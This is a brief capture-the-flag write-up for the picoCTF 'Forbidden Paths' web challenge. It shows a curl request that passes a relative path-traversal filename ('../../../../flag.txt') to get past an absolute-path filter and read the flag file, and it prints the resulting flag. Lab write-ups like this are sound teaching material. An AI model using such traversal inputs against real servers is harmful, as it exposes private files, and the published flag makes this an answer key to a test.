# Forbidden Paths

## Descripcion
Can you get the flag? Here's the [website](http://saturn.picoctf.net:52683/). We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?

## Solucion
```console
┌──(yareds45㉿yareds45)-[~/develop/web]
└─$ curl -X POST http://saturn.picoctf.net:52683/read.php --data "filename=../../../../flag.txt" | grep -oE "picoCTF{.*?}" --color=none
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   394    0   365  100    29   1823    144 --:--:-- --:--:-- --:--:--  1979
picoCTF{7h3_p47h_70_5ucc355_e5fe3d4d}

```
picoCTF{7h3_p47h_70_5ucc355_e5fe3d4d}